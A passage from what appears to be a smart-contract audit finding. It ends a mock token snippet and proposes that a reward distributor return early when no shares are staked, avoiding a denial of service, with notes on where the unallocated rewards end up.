    function mint(address to, uint256 amount) external { _mint(to, amount); }
}

## Suggested Mitigation
Modify `Distributor.addRewards` to return early if `totalShares == 0` instead of reverting. 

**Note on implementation**: If `addRewards` returns early, the reward tokens pulled from the Pair will simply remain in the Pair contract. In the next `_update` call, the Pair will sync these excess tokens into its reserves (effectively treating them as a donation to the liquidity pool). Additionally, rewards accrued while `totalShares` is zero will be effectively burned when the first user stakes (as `pendingRewards` are cleared without incrementing `accRewardPerShare` if supply is zero). This is standard behavior and preferable to a Denial of Service.



